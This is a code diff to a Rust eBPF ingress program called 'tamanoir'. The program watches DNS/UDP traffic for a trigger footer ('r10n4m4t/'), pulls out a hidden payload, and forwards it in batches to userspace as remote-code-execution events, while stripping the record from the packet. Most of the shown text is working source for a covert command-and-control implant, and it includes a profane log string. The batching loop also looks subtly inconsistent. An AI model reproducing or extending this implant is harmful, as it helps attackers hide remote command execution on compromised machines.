@@ -7,7 +7,7 @@ use aya_ebpf::{
     maps::PerCpuArray,
     programs::TcContext,
 };
-use aya_log_ebpf::{error, info};
+use aya_log_ebpf::{debug, error, info};
 use network_types::{
     eth::{EthHdr, EtherType},
     ip::{IpProto, Ipv4Hdr},
@@ -15,8 +15,8 @@ use network_types::{
 };
 
 use crate::common::{
-    load_bytes, update_addr, update_ip_hdr_tot_len, update_udp_hdr_len, Rce, UpdateType, HIJACK_IP,
-    IP_SRC_ADDR_OFFSET, RBUF, TARGET_IP, UDP_CSUM_OFFSET, UDP_OFFSET,
+    load_bytes, update_addr, update_ip_hdr_tot_len, update_udp_hdr_len, ContinuationByte, RceEvent,
+    UpdateType, HIJACK_IP, IP_SRC_ADDR_OFFSET, RBUF, TARGET_IP, UDP_CSUM_OFFSET, UDP_OFFSET,
 };
 
 #[classifier]
@@ -28,15 +28,15 @@ pub fn tamanoir_ingress(mut ctx: TcContext) -> i32 {
 }
 
 #[inline]
-fn submit(rce: Rce) {
-    if let Some(mut buf) = RBUF.reserve::<Rce>(0) {
+fn submit(rce: RceEvent) {
+    if let Some(mut buf) = RBUF.reserve::<RceEvent>(0) {
         unsafe { (*buf.as_mut_ptr()) = rce };
         buf.submit(0);
     }
 }
 
 pub struct Buf {
-    pub buf: [u8; 8192],
+    pub buf: [u8; 512],
 }
 
 #[map]
@@ -45,6 +45,8 @@ pub static DNS_PAYLOAD_BUFFER: PerCpuArray<Buf> = PerCpuArray::with_max_entries(
 const AR_HEADER_SZ: usize = 13;
 const FOOTER_TXT: &str = "r10n4m4t/";
 const FOOTER_EXTRA_BYTES: usize = 3;
+const FOOTER_LEN: usize = FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;
+const PAYLOAD_BATCH_LEN: usize = 32;
 
 #[inline]
 fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
@@ -68,43 +70,54 @@ fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
                         -1
                     })?;
 
-                let mut footer = [0u8; FOOTER_TXT.len() + FOOTER_EXTRA_BYTES];
-                let _ = ctx.load_bytes(ctx.len() as usize - FOOTER_TXT.len(), &mut footer)?;
+                let mut footer = [0u8; 2 * FOOTER_LEN]; // make verifier happy
+                let _ = ctx.load_bytes(ctx.len() as usize - FOOTER_LEN, &mut footer)?;
+                let footer = &footer[..FOOTER_LEN];
 
                 let last_bytes_rtcp_trigger: [u8; FOOTER_TXT.len()] =
                     FOOTER_TXT.as_bytes().try_into().unwrap();
 
                 if footer[..FOOTER_TXT.len()] == last_bytes_rtcp_trigger {
-                    info!(ctx, " !! TRIGGER MOTHERFUCKER !! ");
-                    let payload_sz = u16::from_be_bytes(
-                        footer
-                            .get(footer.len().saturating_sub(2)..)
-                            .ok_or(0u32)?
-                            .try_into()
-                            .unwrap(),
-                    ) as usize;
+                    debug!(ctx, " !! TRIGGER MOTHERFUCKER !! ");
+                    let continuation_byte =
+                        ContinuationByte::from_u8(footer[footer.len() - FOOTER_EXTRA_BYTES])
+                            .ok_or(0)?;
+                    let payload_sz =
+                        u16::from_le_bytes(footer[footer.len() - 2..].try_into().map_err(|_| 0)?)
+                            as usize;
 
-                    info!(ctx, "payload is {} bytes long\npayload is:", payload_sz);
+                    debug!(ctx, "payload is {} bytes long\npayload is:", payload_sz);
 
-                    let record_sz =
-                        AR_HEADER_SZ + payload_sz as usize + FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;
+                    let record_sz = AR_HEADER_SZ + payload_sz as usize + FOOTER_LEN;
                     let payload_buf = unsafe {
                         let ptr = DNS_PAYLOAD_BUFFER.get_ptr_mut(0).ok_or(-1)?;
                         &mut (*ptr).buf
                     };
                     load_bytes(
                         ctx,
-                        ctx.len().saturating_sub(
-                            (FOOTER_TXT.len() + FOOTER_EXTRA_BYTES + payload_sz) as u32,
-                        ) as usize,
+                        ctx.len() as usize - FOOTER_LEN - payload_sz,
                         payload_buf,
                     )?;
+                    let mut consumed = 0;
 
-                    let payload = &payload_buf.get(..payload_sz);
-                    if let Some(p) = *payload {
-                        for c in p {
-                            info!(ctx, " {} ", *c);
-                        }
+                    let buf = unsafe {
+                        let ptr = DNS_PAYLOAD_BUFFER.get_ptr(0).ok_or(-1)?;
+                        &(*ptr).buf
+                    };
+                    let mut idx = 0;
+                    while consumed < payload_sz {
+                        let batch = buf.get(idx..idx + PAYLOAD_BATCH_LEN).ok_or(0)?;
+                        consumed += batch.len();
+
+                        let is_last = consumed >= payload_sz;
+
+                        submit(RceEvent {
+                            prog: payload_buf[..PAYLOAD_BATCH_LEN].try_into().map_err(|_| 0)?,
+                            event_type: continuation_byte.clone(),
+                            length: batch.len().min(payload_sz),
+                            last_batch: is_last,
+                        });
+                        idx += batch.len();
                     }
 
                     unsafe {
@@ -123,10 +136,6 @@ fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
                         ctx,
                         &(u16::from_be(udp_hdr.len).saturating_sub(record_sz as u16)).to_be(),
                     )?;
-                    submit(Rce {
-                        prog: 0,
-                        active: true,
-                    })
                 }
                 info!(
                     ctx,
